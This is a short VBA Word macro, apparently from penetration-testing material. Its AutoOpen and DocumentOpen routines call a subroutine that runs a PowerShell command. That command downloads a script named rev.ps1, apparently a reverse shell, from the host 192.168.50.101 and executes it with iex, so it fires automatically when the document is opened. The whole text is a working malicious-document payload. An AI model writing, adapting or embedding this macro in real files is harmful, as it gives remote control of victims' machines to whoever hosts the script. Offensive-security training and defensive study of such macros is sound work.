Sub mymacro()
    Dim Command As String
    Command = "powershell.exe iex(iwr http://192.168.50.101/rev.ps1 -UseBasicParsing)"
    Shell Command, 1
End Sub
Sub AutoOpen()
    mymacro
End Sub
Sub DocumentOpen()
    mymacro
End Sub
